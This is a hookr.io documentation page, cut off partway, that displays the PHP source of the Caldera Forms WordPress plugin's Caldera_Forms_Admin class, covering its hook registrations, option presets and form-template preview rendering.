<!DOCTYPE html> <!--[if lt IE 7]><html class="hookr class lt-ie9 lt-ie8 lt-ie7 ie"><![endif]--> <!--[if IE 7]><html class="hookr class lt-ie9 lt-ie8 ie7 ie"><![endif]--> <!--[if IE 8]><html class="hookr class lt-ie9 ie8 ie"><![endif]--> <!--[if IE 9]><html class="hookr class ie9 ie"><![endif]--> <!--[if gt IE 9]><html class="hookr class gt-ie9 ie"><![endif]--><html lang="en-US" id="single" class="hookr class" data-site="wordpress" data-id="79183"><head xmlns="http://www.w3.org/1999/xhtml"><title> caldera_forms_admin | class | WordPress | hookr.io</title><meta charset="UTF-8"><meta name="author" content="thepassionofthechris \m/," /><meta name="keywords" content="Caldera_Forms_Admin, class, plugin, caldera-forms, 1.5.0.9" /><meta name="description" content="Caldera_Forms Plugin class." /><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"><link rel="shortcut icon" href="http://hookr.io/wp-content/themes/hookr/assets/images/favicon.ico" /><link rel="icon" type="image/png" href="http://hookr.io/wp-content/themes/hookr/assets/images/favicon.png"><link rel="icon" type="image/gif" href="http://hookr.io/wp-content/themes/hookr/assets/images/favicon.gif"><link rel="icon" type="image/jpeg" href="http://hookr.io/wp-content/themes/hookr/assets/images/favicon.jpg"><meta name="google-site-verification" content="Q5dnl0YziNqRLCBxFtc2Rd8vUuueYAt6VIUYZItvEL4" /><script type="text/javascript">/*<![CDATA[*/window._wpemojiSettings={"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/hookr.io\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.4.13"}};!function(a,b,c){function d(a){var c,d,e,f=b.createElement("canvas"),g=f.getContext&&f.getContext("2d"),h=String.fromCharCode;return g&&g.fillText?(g.textBaseline="top",g.font="600 32px Arial","flag"===a?(g.fillText(h(55356,56806,55356,56826),0,0),f.toDataURL().length>3e3):"diversity"===a?(g.fillText(h(55356,57221),0,0),c=g.getImageData(16,16,1,1).data,g.fillText(h(55356,57221,55356,57343),0,0),c=g.getImageData(16,16,1,1).data,e=c[0]+","+c[1]+","+c[2]+","+c[3],d!==e):("simple"===a?g.fillText(h(55357,56835),0,0):g.fillText(h(55356,57135),0,0),0!==g.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag"),unicode8:d("unicode8"),diversity:d("diversity")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag&&c.supports.unicode8&&c.supports.diversity||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);/*]]>*/</script><style type="text/css">img.wp-smiley,img.emoji{display:inline !important;border:none !important;box-shadow:none !important;height:1em !important;width:1em !important;margin:0
.07em !important;vertical-align:-0.1em !important;background:none !important;padding:0
!important}</style><link rel='stylesheet' id='screen-css'  href='http://hookr.io/wp-content/themes/hookr/assets/css/hookr.css?ver=a5d55b892927d6d3efbc257c49e9cf52' type='text/css' media='screen' /><link rel='stylesheet' id='qtip-css'  href='http://hookr.io/wp-content/themes/hookr/assets/vendor/jquery.qtip.custom/jquery.qtip.min.css?ver=4.4.13' type='text/css' media='screen' /><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/fU9dGoIwDLsQW_XbHbyAXmCMAsNBsS2otxcYvqFP_UmaJg66x4T8LtzemD427BVtH4fiBC3RncGLoAp0AqWYRDS2lA4ZMw4VMZREKsp-NM46e14PlShpHJc_UwSsawz6R6CbURX38oNzDUwp3egSX1iZ3osif0PIhinVK3YQI9NsWNYRs6dAnCNt0zNWDW4OPw.js"></script><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/M9YvzdTPzS8tTtXLzcwDAA.js"></script><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/fZBBDsIwDAQ_RG1Kn8AvuKWJUQ1JHBIXVF5PKOoFKZV8Gc_KK3nAmVHNWCBwPAxfKp4d5ZWPOIncM5pSSAve6jxmygskbyxN4mvwP_Sk6KRSSJ6vS9dDD6eNGkdXbu3hV9nUs7JvSpNqrzXK0uwFKyFJpKg7V3jPwZPp1XjDm7JYz2kUk10XTFHK6LgoXqo5b-YD.js"></script><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/M9DPyM_PLtJPLC5OLSnWL0vNS8kv0s8qLE0tqtQrLMks0EsuLS7Jz0URys3MAwA.js"></script><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/M9YvzdRPTUtLTS7RzchMz8gB4hK93Mw8HQP9jPz87CL9xOLi1JJi_axiCF8vsSBTrzgzLz0nFQA.js"></script><link rel='https://api.w.org/' href='http://hookr.io/wp-json/' /><link rel="canonical" href="http://hookr.io/classes/caldera_forms_admin/" /><link rel="alternate" type="application/json+oembed" href="http://hookr.io/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fhookr.io%2Fclasses%2Fcaldera_forms_admin%2F" /><link rel="alternate" type="text/xml+oembed" href="http://hookr.io/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fhookr.io%2Fclasses%2Fcaldera_forms_admin%2F&#038;format=xml" /><script>/*<![CDATA[*/if('undefined'===typeof Hookr)
var Hookr={};if('undefined'===typeof Hookr.Util)
Hookr.Util={};Hookr.Util=jQuery&&jQuery.extend(Hookr.Util,{"adminAjax":"http:\/\/hookr.io\/wp-admin\/admin-ajax.php","themeUrl":"http:\/\/hookr.io\/wp-content\/themes\/hookr\/","apiKey":"wordpress-1.5.0.9-class-caldera_forms_admin","actions":{"popover":0,"range":1,"search":2,"stat":3}});/*]]>*/</script><!--[if lt IE 9]><script src="http://hookr.io/wp-content/themes/hookr/assets/js/html5shiv.js"></script><script src="http://hookr.io/wp-content/themes/hookr/assets/js/html5shiv-printshiv.js"></script><![endif]--></head><body id="caldera_forms_admin" class="single single-class single-format-standard"><div id="gutter"><div><ul id="nav-breadcrumb" role="navigation" class="pivot clear fix"><li class="home"><a title="Go to hookr.io." href="http://hookr.io" class="home">hookr.io</a></li><li>/</li><li><span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" title="Go to plugins." href="http://hookr.io/plugins/" class=""><span property="name">plugins</span></a><meta property="position" content="2"></span></li><li>/</li><li><span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" title="Go to caldera-forms." href="http://hookr.io/plugins/caldera-forms/" class="plugin"><span property="name">caldera-forms</span></a><meta property="position" content="3"></span></li><li>/</li><li><span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" title="Go to 1.5.0.9." href="http://hookr.io/plugins/caldera-forms/1.5.0.9/" class="H_VERSION"><span property="name">1.5.0.9</span></a><meta property="position" content="4"></span></li><li>/</li><li><span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" title="Go to classes." href="http://hookr.io/plugins/caldera-forms/1.5.0.9/classes/" class=""><span property="name">classes</span></a><meta property="position" content="5"></span></li><li>/</li><li class="current_item"><span property="itemListElement" typeof="ListItem"><span property="name">caldera_forms_admin</span><meta property="position" content="6"></span></li></ul></div></div><header class="jv-fixed"><div> <button class="btn" data-jv-trigger="left"><span></span></button><h1 title="hookr.io"><a href="http://hookr.io" title="hookr.io"><img src="http://hookr.io/wp-content/themes/hookr/assets/images/hookr.svg" title="The WordPress Hook/API Index" alt="The WordPress Hook/API Index"/></a></h1> <nav id="nav-api-types" class="pivot clearfix" data-jv-order="0" data-jv-content="left" data-active="class"><ul role="navigation"><li class="" data-id="all" data-count="0"><a href="http://hookr.io/1.5.0.9/all/" title="All">All <span class="count badge">0</span></a></li><li class="" data-id="new" data-count="0"><a href="http://hookr.io/1.5.0.9/new/" title="New">New <span class="count badge">0</span></a></li><li class="" data-id="hooks" data-count="0"><a href="http://hookr.io/1.5.0.9/hooks/" title="Hooks">Hooks <span class="count badge">0</span></a></li><li class="" data-id="action" data-count="0"><a href="http://hookr.io/1.5.0.9/actions/" title="Actions">Actions <span class="count badge">0</span></a></li><li class="" data-id="filter" data-count="0"><a href="http://hookr.io/1.5.0.9/filters/" title="Filters">Filters <span class="count badge">0</span></a></li><li class="active" data-id="class" data-count="0"><a href="http://hookr.io/1.5.0.9/classes/" title="Classes">Classes <span class="count badge">0</span></a></li><li class="" data-id="constant" data-count="0"><a href="http://hookr.io/1.5.0.9/constants/" title="Constants">Constants <span class="count badge">0</span></a></li><li class="" data-id="function" data-count="0"><a href="http://hookr.io/1.5.0.9/functions/" title="Functions">Functions <span class="count badge">0</span></a></li><li class="" data-id="shortcode" data-count="0"><a href="http://hookr.io/1.5.0.9/shortcodes/" title="Shortcodes">Shortcodes <span class="count badge">0</span></a></li></ul> </nav> <nav id="nav-main" class="pivot" data-jv-order="1" data-jv-content="left"><ul role="navigation"><li class=""><a href="http://hookr.io/all/" title="Core">Core</a></li><li class="active"><a href="http://hookr.io/plugins/" title="Plugins">Plugins</a></li><li class=""><a href="http://hookr.io/themes/" title="Themes">Themes</a></li><li class=""><a href="http://hookr.io/features/" title="Features">Features</a></li><li class=""><a href="http://hookr.io/plugin/" title="Plugin">Plugin</a></li><li class=""><a href="http://hookr.io/about/" title="About">About</a></li><li class=""><a href="http://hookr.io/contact/" title="Contact">Contact</a></li></ul> </nav></div> </header><div role="main" id="middle"><div><div id="mainbar"> <article><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?zoneid=1673&serve=C6AILKT&placement=hookrio" id="_carbonads_js"></script><noscript>derpy.</noscript> <section><h1><strong>Caldera_Forms_Admin</strong></h1><p>Caldera_Forms Plugin class.</p> </section> <section id="defined" class="source"><h2>Defined <span class="count">(1)</span></h2><p>The class is defined in the following location(s).</p><dl><dt><strong><a href="http://hookr.io/plugins/caldera-forms/1.5.0.9/files/classes-admin/" class="file">/classes/admin.php <span>&nbsp;</span></a></strong></dt><dd><pre><ol data-line="18" class="block" start="18"><li><div>class Caldera_Forms_Admin {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @var     string&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    const VERSION = CFCORE_VER;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @var      string&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    protected $plugin_slug = 'caldera-forms';&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @var      string&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    protected $screen_prefix = array();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @var      string&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    protected $sub_prefix = null;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @var      string&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    protected $addons = array();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @var      object&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    protected static $instance = null;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Holds admin notices&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.3.0&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @var array&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    private static $admin_notices;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Initialize the plugin by setting localization, filters, and administration functions.&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    private function __construct() {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        add_filter( 'all_plugins', array( $this, 'prepare_filter_addons' ) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // Load plugin text domain&nbsp;</div></li><li><div>        add_action( 'init', array( $this, 'load_plugin_textdomain' ) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // Add Admin menu page&nbsp;</div></li><li><div>        add_action( 'admin_menu', array( $this, 'register_admin_page' ), 9 );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // Add admin scritps and styles&nbsp;</div></li><li><div>        add_action( 'admin_enqueue_scripts', array( $this, 'enqueue_admin_stylescripts' ), 1 );&nbsp;</div></li><li><div>        &nbsp;</div></li><li><div>        // add element & fields filters&nbsp;</div></li><li><div>        add_filter('caldera_forms_get_panel_extensions', array( $this, 'get_panel_extensions'), 1);&nbsp;</div></li><li><div>        add_filter('caldera_forms_entry_viewer_buttons', array( $this, 'set_viewer_buttons'), 10, 4);&nbsp;</div></li><li><div>        add_filter('caldera_forms_entry_editor_buttons', array( $this, 'set_editor_buttons'), 10, 4);&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // action&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        add_action('caldera_forms_admin_templates', array( $this, 'get_admin_templates'), 1);&nbsp;</div></li><li><div>        add_action('caldera_forms_entry_meta_templates', array( $this, 'get_admin_meta_templates'), 1);&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        add_action( 'init', array( $this, 'save_form') );&nbsp;</div></li><li><div>        add_action( 'media_buttons', array($this, 'shortcode_insert_button' ), 11 );&nbsp;</div></li><li><div>        add_filter( 'wp_fullscreen_buttons', array($this, 'shortcode_insert_button_fs' ), 11 );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // filter for adding presets&nbsp;</div></li><li><div>        add_filter( 'caldera_forms_field_option_presets', array($this, 'load_option_presets' ) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if( current_user_can( Caldera_Forms::get_manage_cap( 'create' ) ) ) {&nbsp;</div></li><li><div>            // create forms&nbsp;</div></li><li><div>            add_action(&quot;wp_ajax_create_form&quot;, array( $this, 'create_form') );&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if( current_user_can( Caldera_Forms::get_manage_cap( 'admin' ) ) ) {&nbsp;</div></li><li><div>            add_action( &quot;wp_ajax_toggle_form_state&quot;, array( $this, 'toggle_form_state' ) );&nbsp;</div></li><li><div>            add_action( &quot;wp_ajax_save_cf_setting&quot;, array( $this, 'save_cf_setting' ) );&nbsp;</div></li><li><div>            add_action( &quot;wp_ajax_cf_dismiss_pointer&quot;, array( $this, 'update_pointer' ) );&nbsp;</div></li><li><div>            add_action( &quot;wp_ajax_cf_bulk_action&quot;, array( $this, 'bulk_action' ) );&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>        add_action(&quot;wp_ajax_cf_get_form_preview&quot;, array( $this, 'get_form_preview') );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        add_action( 'caldera_forms_admin_footer', array( $this, 'admin_alerts' ) );&nbsp;</div></li><li><div>        add_action( 'admin_footer', array( $this, 'add_shortcode_inserter'));&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $this-&gt;addons = apply_filters( 'caldera_forms_get_active_addons', array() );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        add_action('admin_footer-edit.php', array( $this, 'render_editor_template')); // Fired on the page with the posts table&nbsp;</div></li><li><div>        add_action('admin_footer-post.php', array( $this, 'render_editor_template')); // Fired on post edit page&nbsp;</div></li><li><div>        add_action('admin_footer-post-new.php', array( $this, 'render_editor_template')); // Fired on add new post page&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        add_action( 'caldera_forms_new_form_template_end', array( $this, 'load_new_form_templates') );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        add_action( 'admin_init', array( $this, 'watch_tracking' ) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        add_action( 'caldera_forms_prerender_edit', array( __CLASS__, 'easy_pods_auto_populate' ) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        /**&nbsp;</div></li><li><div>         * Runs after Caldera Forms admin is initialized&nbsp;</div></li><li><div>         *&nbsp;</div></li><li><div>         * @since 1.3.5.3&nbsp;</div></li><li><div>         */&nbsp;</div></li><li><div>        do_action( 'caldera_forms_admin_init' );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        /** Adding anything to this constructor after caldera_forms_admin_init action is a violation of intergalactic law */&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    public function render_editor_template() {&nbsp;</div></li><li><div>        ?&gt;&nbsp;</div></li><li><div>        &lt;script type=&quot;text/html&quot; id=&quot;tmpl-editor-caldera-forms&quot;&gt;&nbsp;</div></li><li><div>            &lt;# if ( data.html ) { #&gt;&nbsp;</div></li><li><div>                {{{ data.html }}}&nbsp;</div></li><li><div>                &lt;# } else { #&gt;&nbsp;</div></li><li><div>                    &lt;div class=&quot;wpview-error&quot;&gt;&nbsp;</div></li><li><div>                        &lt;div class=&quot;dashicons dashicons-cf-logo&quot;&gt;&lt;/div&gt;&lt;p style=&quot;font-size: 13px;&quot;&gt;&lt;?php _e( 'Invalid Form.', 'caldera-forms' ); ?&gt;&lt;/p&gt;&nbsp;</div></li><li><div>                    &lt;/div&gt;&nbsp;</div></li><li><div>                    &lt;# } #&gt;&nbsp;</div></li><li><div>        &lt;/script&gt;&nbsp;</div></li><li><div>        &lt;?php&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Returns the array of option presets for option based fields.&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.4.0&nbsp;</div></li><li><div>     * @param array $presets current array of presets&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @return    array array of presets&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>     public function load_option_presets( $presets ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>         $internal = array_merge( $presets, array(&nbsp;</div></li><li><div>             'countries_iso_alpha_2' =&gt; array(&nbsp;</div></li><li><div>                 'name' =&gt; __( 'Countries (ISO Alpha-2)', 'caldera-forms'), &nbsp;</div></li><li><div>                 'data' =&gt; file_get_contents( CFCORE_PATH . 'includes/presets/countries_iso_alpha_2.txt' ), &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>            'countries_names' =&gt; array(&nbsp;</div></li><li><div>                'name' =&gt; __( 'Countries (Names Only)', 'caldera-forms'), &nbsp;</div></li><li><div>                'data' =&gt; file_get_contents( CFCORE_PATH . 'includes/presets/countries_names.txt' ), &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>            'continents' =&gt; array(&nbsp;</div></li><li><div>                'name' =&gt; __( 'Continents', 'caldera-forms'), &nbsp;</div></li><li><div>                'data' =&gt; array(&nbsp;</div></li><li><div>                    &quot;Africa&quot;, &nbsp;</div></li><li><div>                    &quot;Antarctica&quot;, &nbsp;</div></li><li><div>                    &quot;Asia&quot;, &nbsp;</div></li><li><div>                    &quot;Australia&quot;, &nbsp;</div></li><li><div>                    &quot;Europe&quot;, &nbsp;</div></li><li><div>                    &quot;North America&quot;, &nbsp;</div></li><li><div>                    &quot;South America&quot;, &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>            'canadian_provinces_territories' =&gt; array(&nbsp;</div></li><li><div>                'name' =&gt; __( 'Canadian Provinces & Territories', 'caldera-forms'), &nbsp;</div></li><li><div>                'data' =&gt; array(&nbsp;</div></li><li><div>                    &quot;Alberta&quot;, &nbsp;</div></li><li><div>                    &quot;British Columbia&quot;, &nbsp;</div></li><li><div>                    &quot;Manitoba&quot;, &nbsp;</div></li><li><div>                    &quot;New Brunswick&quot;, &nbsp;</div></li><li><div>                    &quot;Newfoundland and Labrador&quot;, &nbsp;</div></li><li><div>                    &quot;Northwest Territories&quot;, &nbsp;</div></li><li><div>                    &quot;Nova Scotia&quot;, &nbsp;</div></li><li><div>                    &quot;Nunavut&quot;, &nbsp;</div></li><li><div>                    &quot;Ontario&quot;, &nbsp;</div></li><li><div>                    &quot;Prince Edward Island&quot;, &nbsp;</div></li><li><div>                    &quot;Quebec&quot;, &nbsp;</div></li><li><div>                    &quot;Saskatchewan&quot;, &nbsp;</div></li><li><div>                    &quot;Yukon&quot;, &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div> ));&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>         return $internal;&nbsp;</div></li><li><div>     }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Returns the array of form templates.&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 1.2.3&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @return    array The form templates&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function internal_form_templates() {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $internal_templates = array(&nbsp;</div></li><li><div>            'starter_contact_form' =&gt; array(&nbsp;</div></li><li><div>                'name' =&gt; esc_html__( 'Contact Form', 'caldera-forms' ), &nbsp;</div></li><li><div>                'template' =&gt; include CFCORE_PATH . 'includes/templates/starter-contact-form.php'&nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>            'variable_price_example' =&gt; array(&nbsp;</div></li><li><div>                'name' =&gt; esc_html__( 'Variable Pricing Form - with add-on products', 'caldera-forms' ), &nbsp;</div></li><li><div>                'template' =&gt; include CFCORE_PATH . 'includes/templates/variable-price-example.php'&nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>            'registration' =&gt; array(&nbsp;</div></li><li><div>                'name' =&gt; esc_html__( 'Registration Form - with optional additional participants', 'caldera-forms' ), &nbsp;</div></li><li><div>                'template' =&gt; include CFCORE_PATH . 'includes/templates/registration-form-example.php'&nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>            'simple_booking_form_example' =&gt; array(&nbsp;</div></li><li><div>                'name' =&gt; esc_html__( 'Simple Booking Form', 'caldera-forms' ), &nbsp;</div></li><li><div>                'template' =&gt; include CFCORE_PATH . 'includes/templates/simple-booking-form-example.php'&nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>            'rate-our-service-example' =&gt; array(&nbsp;</div></li><li><div>                'name' =&gt; esc_html__( 'Rate Our Service Form - with star review', 'caldera-forms' ), &nbsp;</div></li><li><div>                'template' =&gt; include CFCORE_PATH . 'includes/templates/rate-our-service-example.php'&nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>            'job-application-form-example' =&gt; array(&nbsp;</div></li><li><div>                'name' =&gt; esc_html__( 'Job Application Form - with Gravatar preview', 'caldera-forms' ), &nbsp;</div></li><li><div>                'template' =&gt; include CFCORE_PATH . 'includes/templates/job-application-form-example.php'&nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        /**&nbsp;</div></li><li><div>         * Filter form templates&nbsp;</div></li><li><div>         *&nbsp;</div></li><li><div>         * @since 1.2.3&nbsp;</div></li><li><div>         *&nbsp;</div></li><li><div>         * @param array $internal_templates Form templates&nbsp;</div></li><li><div>         */&nbsp;</div></li><li><div>        return apply_filters( 'caldera_forms_get_form_templates', $internal_templates );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    public function load_new_form_templates() {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $form_templates = self::internal_form_templates();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        ?&gt;&nbsp;</div></li><li><div>        &lt;div class=&quot;cf-templates-wrapper&quot;&gt;&nbsp;</div></li><li><div>            &lt;?php&nbsp;</div></li><li><div>            $selected_field = '';//' checked=&quot;checked&quot;';&nbsp;</div></li><li><div>            $selected_template = '';//' selected';&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            foreach( $form_templates as $template_slug =&gt; $template ) {&nbsp;</div></li><li><div>                if( !empty( $template['template'] ) && !empty( $template['name'] ) ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                    echo '&lt;label class=&quot;caldera-grid cf-form-template' . $selected_template . '&quot;&gt;';&nbsp;</div></li><li><div>                        echo '&lt;small&gt;' . $template['name'] . '&lt;/small&gt;';&nbsp;</div></li><li><div>                        &nbsp;</div></li><li><div>                        echo '&lt;input type=&quot;radio&quot; name=&quot;template&quot; value=&quot;' . $template_slug . '&quot; class=&quot;cf-template-select&quot;' . $selected_field . '&gt;';&nbsp;</div></li><li><div>                        &nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        // check a layout exists&nbsp;</div></li><li><div>                        if( !empty( $template['preview'] ) ) {&nbsp;</div></li><li><div>                            echo '&lt;img src=&quot;' . esc_url( $template['preview'] ) . '&quot;&gt;&lt;/label&gt;';&nbsp;</div></li><li><div>                            continue;&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>                        if( empty( $template['template']['layout_grid'] ) || empty( $template['template']['layout_grid']['structure'] ) || empty( $template['template']['layout_grid']['fields'] ) ) {&nbsp;</div></li><li><div>                            echo '&lt;p class=&quot;description&quot; style=&quot;padding: 50px 0px; text-align: center;&quot;&gt;' . esc_html__( 'Preview not available', 'caldera-forms' ) . '&lt;/p&gt;&lt;/label&gt;';&nbsp;</div></li><li><div>                            continue;                            &nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        $struct = explode('|', $template['template']['layout_grid']['structure'] );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        foreach ($struct as $row_num=&gt;$row) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                            $columns = explode( ':', $row );&nbsp;</div></li><li><div>                            echo '&lt;div class=&quot;row&quot; style=&quot;margin: 6px 0px;&quot;&gt;';&nbsp;</div></li><li><div>                                foreach ($columns as $column_num=&gt;$column) {&nbsp;</div></li><li><div>                                    //var_dump( $template['template']['layout_grid']['fields'][ ( $row_num+1) . ':' . ( $column_num+1) ] );&nbsp;</div></li><li><div>                                    $fields = array_keys( $template['template']['layout_grid']['fields'], ( $row_num+1) . ':' . ( $column_num+1) );&nbsp;</div></li><li><div>                                    echo '&lt;div class=&quot;col-sm-' . $column . '&quot; style=&quot;padding: 0px 3px;&quot;&gt;';&nbsp;</div></li><li><div>                                    echo '&lt;div class=&quot;cf-template-column&quot;&gt;';&nbsp;</div></li><li><div>                                    foreach( $fields as $field ) {&nbsp;</div></li><li><div>                                        if( isset( $template['template']['fields'][ $field ] ) ) {&nbsp;</div></li><li><div>                                            if( $template['template']['fields'][ $field ]['type'] == 'button') {&nbsp;</div></li><li><div>                                                echo '&lt;small class=&quot;cf-preview-field cf-preview-button&quot;&gt;' . $template['template']['fields'][ $field ]['label'] .'&lt;/small&gt;';&nbsp;</div></li><li><div>                                            }elseif( $template['template']['fields'][ $field ]['type'] == 'html') {&nbsp;</div></li><li><div>                                                echo '&lt;small class=&quot;cf-preview-field cf-preview-field-html&quot;&gt;&lt;/small&gt;';&nbsp;</div></li><li><div>                                            }elseif( $template['template']['fields'][ $field ]['type'] == 'paragraph') {&nbsp;</div></li><li><div>                                                echo '&lt;small class=&quot;cf-preview-field&quot; style=&quot;height:50px;&quot;&gt;' . $template['template']['fields'][ $field ]['label'] .'&lt;/small&gt;';&nbsp;</div></li><li><div>                                            }elseif( $template['template']['fields'][ $field ]['type'] == 'hidden') {&nbsp;</div></li><li><div>                                                // nope- nothing&nbsp;</div></li><li><div>                                            }else{&nbsp;</div></li><li><div>                                                echo '&lt;small class=&quot;cf-preview-field&quot;&gt;' . $template['template']['fields'][ $field ]['label'] .'&lt;/small&gt;';&nbsp;</div></li><li><div>                                            }&nbsp;</div></li><li><div>                                        }&nbsp;</div></li><li><div>                                    }&nbsp;</div></li><li><div>                                    echo '&lt;/div&gt;';&nbsp;</div></li><li><div>                                    echo '&lt;/div&gt;';&nbsp;</div></li><li><div>                                }&nbsp;</div></li><li><div>                                &nbsp;</div></li><li><div>                            echo '&lt;/div&gt;';&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>                    &nbsp;</div></li><li><div>                    echo '&lt;/label&gt;';&nbsp;</div></li><li><div>                    // unset selection&nbsp;</div></li><li><div>                    $selected_field = null;&nbsp;</div></li><li><div>                    $selected_template = null;&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            ?&gt;&nbsp;</div></li><li><div>            &lt;label class=&quot;caldera-grid cf-form-template&quot;&gt;&nbsp;</div></li><li><div>                &lt;small&gt;&lt;?php echo esc_html__( 'Blank Form', 'caldera-forms' ); ?&gt;&lt;/small&gt;&nbsp;</div></li><li><div>                &lt;input type=&quot;radio&quot; name=&quot;template&quot; value=&quot;&quot; class=&quot;cf-template-select&quot;&gt;&nbsp;</div></li><li><div>            &lt;/label&gt;&nbsp;</div></li><li><div>            &lt;div class=&quot;caldera-grid cf-form-create&quot; style=&quot;display:none; visibility: hidden;&quot; aria-hidden=&quot;true&quot;&gt;&nbsp;</div></li><li><div>                &lt;div class=&quot;cf-template-title&quot;&gt;&lt;/div&gt;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                &lt;div 